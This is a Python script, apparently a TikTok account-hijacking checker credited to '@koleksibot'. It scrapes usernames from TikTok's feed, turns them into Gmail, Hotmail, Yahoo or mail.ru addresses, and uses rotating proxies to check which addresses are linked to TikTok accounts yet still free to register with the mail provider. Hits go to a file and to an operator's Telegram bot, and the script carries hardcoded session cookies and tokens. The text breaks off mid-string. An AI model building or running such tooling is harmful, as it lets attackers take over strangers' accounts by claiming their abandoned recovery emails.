BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
Black="\033[1;30m"       # Black
Red="\033[1;31m"         # 
Green="\033[1;32m"       # 'هGreen
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White
from os import system as Download
try:
	import requests
	from time import sleep as Seconds
	from user_agent import generate_user_agent
	import json
	import random
except :
	print(Yellow+'==== Download library ====')
	Seconds(3.1)
	Download('pip install requests')
	Download('pip install user_agent')
	Download('pip install json')
	Download('pip install random')
	print(Green+'==== DONE ====')	
try:
	import requests
	from time import sleep as Seconds
	from user_agent import generate_user_agent
	import json
	import random
except :
	print('خطأ')
	print('حمل المكاتب التاليه : ')
	print('requests')
	print('random')
	print('json')
	print('user_agent')
	print('-'*9)
	print('''
	هذا شرح في حال كنت ما تعرف كيف تحملهم :
	''')
	exit()


def ex(domen,SEND,Token,ID):
	
	i=0
	while True:
		countr = ['KW','SA','IN','EG','IR','YE']
		country=random.choice(countr)
		if country == 'KW':
			num=30
		elif country == 'SA' :
			num=47
		elif country == 'IN' :
			num=83
		elif country == 'EG' :
			num=62
		elif country == 'IR' :
			num=21
		elif country == 'YE' :
			num=12
		try:
			req=requests.get(f'https://www.tiktok.com/api/recommend/item_list/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=1&browser_language=ar&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F105.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&count={num}&device_id=7100953081626560002&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=&is_fullscreen=false&is_page_visible=true&os=windows&priority_region={country}&referer=&region={country}&screen_height=900&screen_width=1440&tz_name=Asia%2FKuwait&webcast_language=en&msToken=RjTTFgGpN-Hp8PjGwr2FF0E1UUE2SOZH8L3xb4C4Gf5j3N_ji4zWHtzhnRL_vCBmg5GI2XoOK8jkIWFw2DCMHyQIoLr0HBE6wBvYwNtGqI-ozOsbC5LIoSOeo_Pr4xoWcwwjXtRx&X-Bogus=DFSzswVLpWtANydASsdSdQYklTIB&_signature=_02B4Z6wo00001MOxumgAAIDBHcfiz5.AGVzDsb7AAFPN05')
			just_test=req.json()['itemList']
		except :
			continue
		for id in req.json()['itemList']:
			sleep=[9,3,6,4,8,7,5]
			seconds=random.choice(sleep)
			print('\n\n\n')
			i+=1
			pro=['207.180.204.105:3128\n', '94.242.54.119:3128\n', '124.204.33.162:8000\n', '139.59.1.14:3128\n', '103.47.67.154:8080\n', '112.6.117.178:8085\n', '209.97.150.167:3128\n', '201.217.49.2:80\n', '173.212.229.53:3128\n', '182.253.191.132:8080\n', '124.156.100.105:8118\n', '103.144.102.57:8080\n', '217.30.170.213:3128\n', '201.91.82.155:3128\n', '193.31.27.123:80\n', '182.90.224.115:3128\n', '206.189.23.38:8048\n', '119.15.86.130:8080\n', '201.140.208.146:3128\n', '182.101.207.11:8080\n', '129.213.183.152:80\n', '200.106.187.245:999\n', '94.75.76.3:8080\n', '77.247.225.49:3128\n', '20.113.24.12:8080\n', '194.233.77.110:6666\n', '103.164.99.58:8181\n', '120.26.14.114:8888\n', '05.252.161.48:8080\n', '103.181.245.149:8080\n', '67.212.83.54:1080\n', '103.231.78.36:80\n', '114.4.104.254:3128\n', '58.254.141.70:8998\n', '116.58.254.59:8080\n', '176.102.66.197:8888\n', '134.209.111.123:3128\n', '103.110.91.242:3128\n', '31.131.67.14:8080\n', '85.195.104.71:80\n', '62.69.212.197:8090\n', '103.152.232.51:8080\n', '45.148.123.27:3128\n', '122.52.219.36:8080\n', '187.217.54.84:80\n', '5.56.133.132:3128\n', '202.166.165.114:8000\n', '170.233.235.249:3128\n', '181.224.207.21:999\n', '102.68.135.229:8080\n', '103.23.206.170:8080\n', '103.156.217.203:8080\n', '197.155.158.22:80\n', '103.242.105.86:3128\n', '45.156.29.126:9090\n', '45.149.43.56:53281\n', '181.10.160.156:8080\n', '36.67.57.45:30066\n', '103.145.57.109:8080\n', '1.71.132.64:30003\n', '88.132.95.93:53281\n', '200.54.22.74:8080\n', '101.200.127.149:3129\n', '47.74.152.29:8888\n', '107.172.73.179:7890\n', '91.230.199.174:61440\n', '110.78.114.161:8080\n', '156.200.116.68:1981\n', '54.39.102.233:3128\n', '36.68.44.34:8080\n', '139.9.64.238:443\n', '60.21.210.178:10808\n', '181.10.117.254:999\n', '202.180.20.66:8080\n', '185.78.67.133:3128\n', '14.207.85.37:8080\n', '103.248.93.5:8080\n', '209.146.19.61:55443\n', '185.242.86.9:8080\n', '177.105.232.114:8080\n', '45.127.56.194:84\n', '197.248.184.158:53281\n', '181.48.23.250:8080\n', '201.184.176.107:8080\n', '103.114.98.217:6000\n', '67.212.83.55:1080\n', '35.240.63.166:3128\n', '159.196.222.215:8080\n', '190.61.84.166:9812\n', '178.54.21.203:8081\n', '91.233.111.49:1080\n', '190.2.210.249:999\n', '103.172.70.18:8080\n', '181.191.140.134:999\n', '187.1.88.106:3128\n', '45.180.10.197:999\n', '36.89.156.146:8080\n', '45.7.177.238:34234\n', '45.71.115.203:999\n', '157.119.211.133:8080\n', '105.243.252.21:8080\n', '115.124.75.33:8080\n', '43.243.172.18:83\n', '216.137.184.253:80\n', '103.144.18.94:8083\n', '103.134.97.49:83\n', '201.157.254.26:8080\n', '177.128.44.131:6006\n', '80.244.231.133:8080\n', '85.121.208.223:2019\n', '82.165.21.59:80\n', '41.65.174.120:1976\n', '138.199.15.141:8080\n', '138.117.231.130:999\n', '110.170.126.13:3128\n', '110.232.66.209:808\n', '197.232.135.174:41890\n', '165.16.27.33:1976\n', '176.214.97.13:8081\n', '151.22.181.214:8080\n', '139.255.5.98:8080\n', '209.97.150.167:8080\n', '38.127.179.79:29602\n', '193.138.146.67:3128\n', '119.184.185.80:8118\n', '18.196.34.179:37881\n', '154.236.177.101:1981\n', '103.123.64.234:3128\n', '139.59.249.244:7777\n', '5.104.174.199:23500\n', '43.243.174.3:82\n', '1.203.115.191:30003\n', '111.225.152.141:8089\n', '200.54.25.226:8080\n', '103.156.15.34:8080\n', '111.118.135.132:56627\n', '202.62.10.51:8082\n', '125.25.82.190:8080\n', '36.94.183.153:8080\n', '185.110.211.217:8080\n', '134.19.254.2:21231\n', '207.180.217.107:3128\n', '78.186.85.127:10001\n', '103.131.18.119:8080\n', '185.51.10.19:80\n', '103.105.228.66:8080\n', '103.41.212.230:44759\n', '103.159.90.42:83\n', '188.133.173.21:8080\n', '202.164.152.233:8080\n', '182.253.73.130:8080\n', '203.189.89.158:8080\n', '181.176.221.151:9812\n', '93.86.63.73:8080\n', '103.37.141.69:80\n', '173.82.149.243:8080\n', '190.90.242.210:999\n', '36.255.86.114:83\n', '218.86.87.171:31661\n', '88.1.165.103:3128\n', '212.164.52.198:80\n', '41.65.236.37:1976\n', '181.129.2.90:8081\n', '196.202.215.143:41890\n', '156.200.110.116:1976\n', '190.220.1.173:56974\n', '43.250.127.98:9001\n', '47.112.122.163:82\n', '179.255.219.182:8080\n', '188.170.251.195:8080\n', '46.161.195.105:1981\n', '93.240.4.54:3128\n', '177.220.188.213:8080\n', '50.233.228.147:8080\n', '140.227.127.205:80\n', '213.230.121.116:3128\n', '178.210.51.118:8080\n', '91.211.246.30:3128\n', '118.163.13.200:8080\n', '189.203.234.146:999\n', '213.212.210.252:1976\n', '41.65.236.37:1981\n', '183.89.143.134:8080\n', '190.2.210.186:999\n', '112.124.56.162:8080\n', '125.25.32.214:8080\n', '202.62.52.4:8080\n', '149.34.2.39:8080\n', '193.233.162.65:8080\n', '212.64.72.199:8080\n', '161.97.123.237:3128\n', '36.93.18.141:9812\n', '95.0.168.46:1981\n', '131.72.69.202:40033\n', '181.204.44.235:999\n', '172.97.119.193:8181\n', '203.189.137.180:9812\n', '103.79.74.193:53879\n', '167.114.185.69:3128\n', '203.112.223.126:8080\n']
			prox=random.choice(pro)
			proxies={
			'http':f'http://{prox}',
			'socks4':f'socks4://{prox}',
			'socks5':f'socks5://{prox}',
			}
			
			email=(id['author']['uniqueId'])
				
				
				
				
			if domen =='gmail':
				email=email+'@gmail.com'
			elif  domen =='hotmail':
				email=email+'@hotmail.com'
			elif  domen =='yahoo':
				email=email+'@yahoo.com'
			elif  domen =='outlook':
				email=email+'@outlook.com'
			elif domen == 'mail':
				email=email+'@mail.ru'
			coder = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
			data = f"email={email}&aid=1459&language=en&account_sdk_source=web&region=SA"
			hed = {
				"User-Agent": generate_user_agent()}
			Seconds(seconds)
			r = requests.post(coder,headers=hed,data=data,proxies=proxies)
			
			if '{"is_registered":1}' in r.text:
				if domen =='gmail':
					url = 'https://android.clients.google.com/setup/checkavail'
					headers = {
				'Content-Length': '98',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Host': 'android.clients.google.com',
        'Connection': 'Keep-Alive',
        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',}
					data = json.dumps({
	          'username': email,
	          'version': '3',
	          'firstName': '3mk',
	          'lastName': 'Coder' })
					res = requests.post(url, data=data, headers=headers).json()['status']
					
					if res == 'SUCCESS':
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
						print(f'{Yellow}Berhasil - By {White}:{Red} @koleksibot {White}')
						if SEND == True:
							
							requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {email}\n - By @koleksibot')
						open('done.txt','a').write(email+'\n')
						print(' - '*9)
					else:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						print(' - '*9)
						print('\n')
				elif   domen =='hotmail':
					url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
					data = ''
					headers = {
	"Accept": "*/*",
	"Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Connection": "close",
    "Host": "odc.officeapps.live.com",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
    "uaid": "d06e1498e7ed4def9078bd46883f187b",
    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
					html = requests.get(url, data=data, headers=headers).text
					if 'Neither' in html:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						if SEND == True:
							
							requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {email}\n - By @koleksibot')
						open('done.txt','a').write(email+'\n')
						print(' - '*9)
						print('\n')
					else:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						print(' - '*9)
						print('\n')
				elif  domen =='yahoo':
					headers = {
			'authority': 'login.yahoo.com',
		  'accept': '*/*',
		  'accept-language': 'en-US,en;q=0.9',
		  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'origin': 'https://login.yahoo.com',
      'referer': 'https://login.yahoo.com/account/module/create?intl=xa&specId=yidregsimplified&context=reg&done=https%3A%2F%2Fwww.yahoo.com',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
}
					cook = {
					'A3': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
				  'A1': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
				  'A1S': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc&j=WORLD',
				  'AS': 'v=1&s=0sHA17fo&d=A62cb7327|5xRp8pr.2UJmOAqR8uAJglbFObbsH8uOznbuKM00ySlD8Ha.X4jNUXo4VEjGrKs97pN8kPAqzIf1jQcTQp5veb991hp7CXQa18n8eMvtp0i3TKdzY_snYqc41YJj1lVf5YXbOhZFbUgbZ2.BI5VJuQoxc9BfU6gFuHcokkx86DndLRGqMpFyzmFeAViTx6LSbPs2soSDVxJyEtCeBln32VP6QDigRPlUzpL8mrluwSF4NXjjJg3kpS308GYePy96Pznh3CvVja7A0RUIQanRzwQWoKX7u3c5Kgak5jZEasYEQHnqWNCzZXZn5j7BKRKruJ3nhcjBB0BD7YCmViG7NYR1QnbCOntbcWVTvhgr3v7fYIg5cx93ChX3TrMiqfnj.h35U2rNdLWlilATg3BEysTnYSjSIsKcQYnA4C9vzP8Db7tHidwbS1cCjttg.aOyemeymvsE2Y_FsfkK4Qeqx6b0cwqrM7IqzCp0vQp5I_87QmIk8boy4dYeyswIGcdnkLJb45mKMh3DsI5vMN7xyTRhJYO7JVMisaK0Zw8EyrG8z8hCgnozUBv3LpyJjxqbGQGcNBkvn7lhWZgLvsNoBUgVaTEYw5UC0aG7QCh2U7KF9qvv9O0CMZor7aubtx3Z.7SKZVAo7f1yPc4huhhlghkzbNn4BQBL0Fx0dEjQ3Df54gjiOVp5AcJlGM9qlkjbIMDQlg2n_LDedAwQgRoyvPxyrP.Tvqua0OFVi_LUaamtbNsS1SgmJTKobw2K3R39VKy9gcA0vieC9MvgkXQI._E_vz1BtEav0E6RsD2cD.k9j0Jw2brizvfy1wfr6vWoC1bqTMwiEzNGjsX0ug9Yf.yzteWwiWeIAbBG5aSyw9r4O_D9AIig62YIj6y5ERN1msWLRSFv3Dj.ExQ2ek7xuSeN7qW5EIh.4Pnvbm1WNv1TXVuw23WA7HV7WtEiOkfFDs5DvjhLX4MIU_Bt.gpZAcg89Yg-~A|B62cb779f|5f1yTBf.2Tq2W7LQ3KsSFbticESMze16y.0N0bOBd_EFQ_q1.moN9y.T_Vf0mwzJRub.9SzesA7Pzge4dwE_n84Jwg31ipQlUd7uIpky29J0EB2spihP_9ukbwI3MhWdMnds18q42N5ajt9kgn10vdAx5Fp9sNFAbXVl0op1I9bNGrfuz_4_P.a8Eoak702B2ebotX0YdNYct.IJ66Qfd8D.3g1ymlmnHxr7Y2IwJYCg15oQyQBeF8Z7DNW8_kZrP1s6dSZpd75ZI6wro_Rwh2ubvUely.oxpRFUTM2Vlh_VxnvDBDkBPaUC6OO0POVyPIbbCYKUWCVKcMQ_iVYhT.Nh0hntrcppxtz4BVp0rB6jAeb8nc0CrwSFRXP4uo8ICcsK22LsRqH7GWqqpQgrgZC51xJoFGph.Z4ZIX8fMu80u4Eh7lVx4emSGoO3UfrvvkL1RFWxHBfnSxeTmc3dYdPIpJj18qWQShVerqs1UcsB7Hxh67QTx1d2VqqKH9y044pHa55bjeSRnOkIYdHYv2us5rQSEw_04BBRBPAgbSnWrl9COJvpVTVeMF6ykV1.TJzQCKltU4uRTKiQIKfy9vGJuiKjwjFc7h1V5S9Y8Jd69EaDEb1XCaeOAruPYJqc9MINCeycUQFqhxUoHKUORcK9RV_9EINbPwgiB290jhdk3mEffmVI8a8RCcIpiW5dwUCgMkrBb90ebetwP_I9I5fke_USUYS3KtIsOq7L8APsJ4lCmwOdfAPm9OWyLz20bOdk0CidwpDFrqqxQt2JfUe_oyJB8FdZRfmcGmvjrnZm6blzGzUbFnxxJ.5ydhPjmf345BXcxnS3E.U0emkN4Wc0V.xzM_hkQh.oCeqWzSqf15eHZRSoLUusEUA.31Md9l67W_lNcQ.6nASTIWxr_q0l8jjGSGyiyJY-~A',
		}
		      	
		      	
					data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A420%2C%22timezone%22%3A%22America%2FLos_Angeles%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%203000%20Direct3D9Ex%20vs_3_0%20ps_3_0%2C%20igdumd64.dll)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1657415199200%2C%22render%22%3A1657415200314%7D%7D&specId=yidregsimplified&cacheStored=&crumb=V0Pr4B6tQHi&acrumb=0sHA17fo&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&attrSetIndex=0&specData=3qiYX%2FHBcI%2F%2BhrvMxYBXgXQb1%2FYAeMSHZmV4MqgmhqN1URqj%2FsjgTGrzl4FYAaAL1UczLgsaT4rm7Cq3BXusOpCF83nfWay%2BC4rhWCth8rBob6OT8S9v0s7KQfuZoeXmPP0NCJxRHjiKlQBmUepkdKTRtym7LERXeBITKc8qTL15f6Vb9O1yc3ZBETBW%2FOpt6%2FNdXvTgPh8z9rX4CcDlWyjVuO2KusJUgIe2sQ%2BSs7EOIYSCVcNUAOqCtXAFkLyS%2FwtNW9ew2r%2BdkiOEmXXi2Akg3YFs3tNskYHR8cTvqHvpf9mEeGwYDCg0%2FGzQybLfG9um3opaS%2Bvnkz19nTE2jfxnlgudhbhKSkg5b4I3WA7tiQh%2BfdpkINdYrPRYXa%2FbQO47iWX9XnSJm536xRWWqrirGNYme3ZP%2FkbEHdsOCRN59fCXf9GEj0GSdIOYs2OI%2FgcOEl%2BQAV3uH0Dg8OZC0Cm9Nrk%2FYJTIntesxVHvpI5qGAYMr8sR47yrUHuZCahwj9T8tJob%2BJh7cKO1rw83V07K4zwiBSzeQyxbKKj%2BoaUK6tDYVCsS0nsPl9YYzNakW4V6hLVHiMlIwrqdSaaqyD%2FpkWwIZon33c6ulzzRogLES4lZi%2B6Y1I34QbnRs1M1%2Blag9xNYAhe2ysOQWsbec5F2vJaYY941UzlAEH5Z2aoCAgUchjmfRvAqwD3J%2FKlAmwATVMjlgwYwiGZb%2Bc6XIyzGV0P4iq%2F0h8mvJaBqloH%2Be8G%2BOApb2ybaGWor1R1RCt5oHPvbi5pcXhv895j3Pf8R%2BzuCxZu%2F2fLWCugzT4auXfUEvQoR9cBsQxKBe%2Fiw6eo78VzExH9qBh2kpEqtjy1LkHzoh24mn%2FTykqvPMu6cOtu0ZNv%2BCQVEXhER%2BLiZmHqtkvc75fUK1ELu4lKpMitRu4%2BnYTf7saiWOVdn2gQgI2p%2FXU7iPBSxwEzabRpoVwb5wUymGZFsloAcLmBz0FuWtkoqfHzmJdQSZY1y%2BJqMKP30vK8Zy9%2F8RVMpvb859VdesnhF%2B%2B1lFWkfCal3tQNR%2FnN%2BScD4A9rDs1alXxvEpGjnXSpCQ569imLxX11pbaozUXipv4%2BG2WrhGGuTulBoeucBhkiTNf3r73WJfwRCCJCEyztLcYbl3x9P6ahKOjGKEdVDnVi4vGIi47A56jVoQn3QoHmahw6PsqlV4dhtd0u%2BYQ0s09rmFGABQjPdQaSddrB0g32WVOBdruFLeevg9bKRkZYOcr1AfWsuIqi6HaDiKCgomeNN0xB77B0lrwLyS6bW5iGTPP6a%2BlokF6YJKoIlh%2B3xVDWZ4%2Bjj3iEViHGJJA4hsLGy%2FN88eRNZ2RVo957EK3%2FE6vu0L4phnMCwMRxx7PVY2d3oHdGfyMpYFnHK1HRhWspF6PbLoz1jewpUPtuUXmA8qtphATgd4GpwugPQJq6L6n1RFRnHd8WrazHf1HxSO1cZObRYDFPwwR1TK4RkS%2FCoHMePTwNFgy85Z%2FDZ3QYKGhQ8himvoLFH9yLpERLhvS7n%2BV%2BXBJhEOUEDqrTgzf87BX2qI5pKB8P1SZelaAgUU3cXMqxo3et1yxlXaeOptj3K6QrZHs%2BjfTWp5rSVCQ7lj%2BFVql1JChhIU7t0E6h0Y73%2Fy%2BSfnUUtLrjySQQD1vHE%2F6eZYQUHUnz7bYj88EVQZ4e8LAYJvh62gYgoHNIHnk%2Bsa18Q3OUVhcCRqaO4XIiUCWXWaMa8TC7OWOicicC7C73mfEapdQoRpacErL5cDj0lVU%2FkSO31BukbIJ3qXArWnB6xHoBG2L%2FJnwURub4U0e65qB3cAnFe1z%2Bu9SIYRQtmEX%2B%2Fb91mI%2F06XMQd3YrYv%2Bod2sTCVHbpiUXe6vR%2FG5edhHiGB53aMuHX1ljEB711okyoJOViTHu1Fuf4pLhvDSZyOeHBqqX5qj%2FsNjoyZGI1o04O%2F2u%2Bo%2BJMy5YvVVRd8ALRgcpOkqdG9KuT00t1b7R5J5TKKxwUbqMKnkUHGbHi3hA9rHD6Kqn7nfFNvzLmFvA7aN4mFbGy8SncJ9O6MBofHhFnPkhC%2FZdxkYtjDAtSRE9AVNvxEbbGHhqhKBJFaDn%2F2zbK1OqAyC1Wy7rjD7bzYZT3RFKprvz4Dp1SZO732C6%2BcEStFzKt1hK%2FzXDidbZz6bgRhasGBzT2m5ty1F8Y9VCUeIcDbhzkcsztEsqjTbgF1VHJvuxAPo14nDI%2FCHcGCOX7aHSXH4U7G0YFH7O09NruPxcR40KCfO%2FF8eQ%2Bd4ovBGb1SW%2F4wcJ9pWzPKS4XUQ5xSlitdekid5nyDTSEIODfW2vLufF9Da%2BFuj87kH0TtBcM0SR7d5XfYAMA1OOmzOt35LCJGFgF%2F3xyLZv1ghZT%2Bx28qC8fZ7V%2FVnH3uYrVM1S%2FIN71UZRS%2FUK6Cq9bVLrRfGSRqAYlpSalBB8squ%2BsGQ%2FrhLtu6J29Ttg0N1wHovjPX9kPgqsVCcYTIrUE0PcZDw%2BGd5EUiyBNF6HZ4oAMafvj5snS9gLIhIcG82aEhwIfiBR9Rwm%2F%2F7hGq5REIesblFcPIszNvXHr8Prb4xetLLmTYlLxHa9FhoiUG3HxbTJFxSPdc03x9h0665awOppQ4YxAQHjcxOrrzjxhrcZH2TL7DAJZS7F%2FpQae11m00SYVMbufIUT5rCqGf1Kc1zLEbVbEksEgsJ3I3xsjexEUPD9tuDOA5KzqfKBGG3jNbuSrfVcVgk6s9bsGRifmYPbk5ahcXu3c7ekuPG72VDVSaS9kpIFMyVDzQV%2F%2BFdK1vIC48pyZXyVNStS6KxQbKj8CkexdqxJwlV1JpRL8sFYb6o0L%2FMJNL%2B2GMVToSJXCqiM0BaBfvBIae2dIhs2tvZlui7IIUdUAQkwAMjjL9LN%2BvIgdoVtCupTMD3TUqTDfU1Cg0C3K98xi5mfeGP6JJwoSlztXIGDuM4EL%2FnSthWs9gniCkxA36e%2F6zW%2FioH0BKVMFanLjjBRUbaKSdVxtQiJYZ6wiYGJhm%2BTGCPMQG2JLlDj4bJeiNCe8wFzDEDUSL8Q65FLSCcZc9UQBxzSSpeIzCSFT4sY%2Fy61Nr%2BgPgBC36PGOx7M0rPPeeU1ePluevsUiXMhcAl7eayJnr5tG1iqRa%2FFSf5jhEaWM7eC10Ey7iAiNDvtxzoSFRqjnEAADD%2FPzhUmcBJdowhE4Y4YBRB81pIgWFgbuhD31Cnfl93n1UBSPEdvR%2B9acYSeFhLoJFkYIjDzwxi9sjp8ik9wUwk70ff9aJRrkfQRWDliWDaJA2um0X%2FYxazTvk6UYJ9du01kePKT%2BUs8fpulOJhEUi2U02ZyqVwpgeoQmdGrztvt9v7U5vICRNpXm3sdcx8bfkvFMRGsUoxPM%2Fxnla9yal2ZtkWPOltctM%2FmdkJtlBvHjffRBOV9CRHP0b7fIZAGFFh2qQbvkRrf53cQQG3OIM5d5AdtiC7769vQ1uKtciUcAmngVpQfMqXBdSgSA5xG1nKfxyZO9oTGIGlf5xJ9lCdoQdLuyJlR6ma5ro29HzqO%2FelrWrajXYFRMqb0jfbMTZiV0hyZpb8Whu6r5KEQ4i2iyZXrMu%2FKXN1LntbdD8%2BHRBQITCt3hvqkk0D%2BU8e1LGceaHsUyVOKx3KN%2FeH3iUAYX4LhP7QKylegSCMX8ujZMyQarDnJmUhdtdVTpqZuskfC3U%2BFuqcV1ueLwy7i7nwlnJR916wpBEKzJxuu5W4XY1xl295AAkrqQ1w3dQD3Y1RmzbHptQooybc87d4P%2BP48djTkXjk5%2BtzQza31zuVMYeXCEOveFDLjhCWJ%2FEfVo4om0PcaQMJ8rIJcwRPbBCHJHPny%2Bp5IjImeGDscr7NZfj6Rxs9a7BzbRv6sSZitlQrzasw8T5XHIglPVLX9qT1uvUhey%2FETHBTZS%2Fy4CyfIwCBgi7TV4L%2FY0D49DyWNvf9TUP4f%2FxP7fPw0MbUkf16e8fzUE2tkvkeeoYzyXkU5Oe9JSS6c2Jfwo%2FFRTB5K75JNwdog8sebO1NyXRVjJlaoS4SgnVJk5Aix2NUPMcIJU5MmYji0gKu1A6QSODbRtXhmvyd8b1FwRv1MWCSmUHfbkZYxLE6GDO24gaYyrwp0h7ahYC55bti4QrVpPDCcGEj7cUBtzUcLMT2MJOXsfjsAbRsRxBW%2BeMOpMhdnEDTFkNIbUPsmzzrMaUu7Y%2BUAfap639tZUe%2FbNqgibgye2KhlXPS%2FTGtxUGsDZqVBCW03N%2FWahUWhtLKp7KJnutk9otzkZ07VHReV1x3fblTYgS59RSPXwUGY97wQCpSbCFpL7xISbzM0SoAegHDQYy09MtD1vfhfDeEZHyR%2FFCt0YLWvI